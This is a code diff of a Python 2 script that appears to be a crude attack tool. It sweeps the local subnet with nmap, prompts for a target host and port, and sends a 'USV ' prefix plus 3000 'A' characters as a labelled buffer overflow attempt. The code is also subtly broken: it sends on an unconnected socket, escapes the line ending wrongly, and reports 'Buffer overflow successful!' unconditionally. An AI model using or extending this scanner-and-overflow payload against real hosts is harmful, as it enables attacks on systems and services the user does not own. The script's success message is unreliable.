@@ -58,7 +58,10 @@ try:
     import sys
     process = subprocess.Popen(['ipconfig','getifaddr','en0'], stdout=subprocess.PIPE)
     for lhost in iter(lambda: process.stdout.read(), ''):
-        print ("Your IP address is:\n\n" + str(lhost).rstrip())
+        if lhost == None:
+            print "Couldn't resolve Local Host IPs.\n[ref. 0000003]"
+        else:
+            print ("Your IP address is:\n\n" + str(lhost).rstrip())
         break
 except Exception as e: print "Couldn't resolve your IP address. Got WiFi?\n[ref. 0000002]"
 
@@ -76,9 +79,11 @@ except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"
     # 0000003 (Handbook Reference)  
 
 try:
+    parts = lhost.split('.')
+    lhostchomp = parts[0] + "." + parts[1] + "." + parts[2] + "."
     import nmap
     import subprocess
-    rhostcommand = "nmap -n -sn " + lhost.rstrip()[:-3] + "-255 -oG - | awk '/Up$/{print $2}'"
+    rhostcommand = "nmap -n -sn " + lhostchomp + "0-255 -oG - | awk '/Up$/{print $2}'"
     pst = subprocess.Popen(rhostcommand, shell=True, stdout=subprocess.PIPE)
     output = pst.stdout.read()
     if output == None:
@@ -86,42 +91,37 @@ try:
     else:
         print "Remote Host IPs:\n"
         print output.rstrip()
-except Exception as e: print "RemoteHost IP fetching broken.\n[ref. 0000003]"
+except Exception as e: print "Remote Host IP fetching broken.\n[ref. 0000003]"
 
 # Console Print GUI:
     # This creates text in the console.
     # 0000001 (Handbook Reference)
- 
+    
 try:  
     print("_________________________________")
     print("\n")
 except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"
 
-# Prompting for Remote Host IP:
-    # This uses Prompter.
-    # Link for library: https://github.com/tylerdave/prompter
+# Inquiring for Remote Host IP:
+    # This uses Inquirer.
+    # Link for library: _____
     # 0000004 (Handbook Reference)
 
-# try:
-#     from prompter import prompt, yesno
-#     while True:
-#         rhost = prompt('Please type your target IP: ')
-#         confirmrhost = yesno('Are you sure?')
-#         if confirmrhost:
-#             break
-# except Exeption as e: print "Issues prompting. Do you have Prompter installed?\n[ref. 0000004]"
+try:
+    outputsplit = output.splitlines()
 
-outputsplit = output.splitlines()
-
-import inquirer
-questions = [
-        inquirer.List('rhostips',
-            message="Choose target IP",
-            choices=outputsplit,
-        ),
-]
-answers = inquirer.prompt(questions)
-print answers ['rhostips']
+    import inquirer
+    questions = [
+            inquirer.List('rhostips',
+                message="Choose target IP",
+                choices=(outputsplit),
+            ),
+    ]
+    answers = inquirer.prompt(questions)
+    answerwip = str(answers.values())
+    rhost = answerwip[2:-2]
+    print "Target IP:\n" + rhost
+except Exception as e: print "Issues inquiring. Do you have Inquirer installed?\n[ref. 0000004]"
 
 # Console Print GUI:
     # This creates text in the console.
@@ -142,9 +142,9 @@ try:
     while True:
         rport = prompt('Please type your target port: ')
         confirmrport = yesno('Are you sure?')
-        if confirmrhost:
+        if confirmrport:
             break
-except Exeption as e: print "Issues prompting. Do you have Prompter installed?\n[ref. 0000004]"
+except Exception as e: print "Issues prompting. Do you have Prompter installed?\n[ref. 0000004]"
 
 # Console Print GUI:
     # This creates text in the console.
@@ -155,48 +155,27 @@ try:
     print("\n")
 except Exception as e: print "Something is horrendously wrong.\n[ref. 0000001]"
 
-print rhost
-print rport
-
 # Buffer Overflow Attempt:
     # This hops on to extraneous data to gain access to your target.
     # 0000005 (Handbook Reference)
-
-#try:
-import sys, socket
-
-for carg in sys.argv:
-
-            if carg == "-s":
-
-                        argnum = sys.argv.index(carg)
-
-                        argnum += 1
-
-                        host = sys.argv[argnum]
-
-            elif carg == "-p":
-
-                        argnum = sys.argv.index(carg)
-
-                        argnum += 1
-
-                        port = sys.argv[argnum]
-
-buffer = "\x41" * 3000
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-i = [rport]
-ip = [rhost]
-
-s.connect(ip + i)
-
-
-s.send("USV " + buffer + "//r//n//r")
-s.close()
-print ("Buffer overflow successful!")
-#except Exception as e: print "Connection refused.\n[ref. 0000005]"
+try:
+    import sys, socket
+    for carg in sys.argv:
+                if carg == "-s":
+                            argnum = sys.argv.index(carg)
+                            argnum += 1
+                            host = sys.argv[argnum]
+                elif carg == "-p":
+                            argnum = sys.argv.index(carg)
+                            argnum += 1
+                            port = sys.argv[argnum]                    
+    buffer = "\x41" * 3000
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket.create_connection((rhost, rport))
+    s.send("USV " + buffer + "//r//n//r")
+    s.close()
+    print ("Buffer overflow successful!")
+except Exception as e: print "Connection refused by Remote Host.\n[ref. 0000005]"
 
 # Console Print GUI:
     # This creates text in the console.
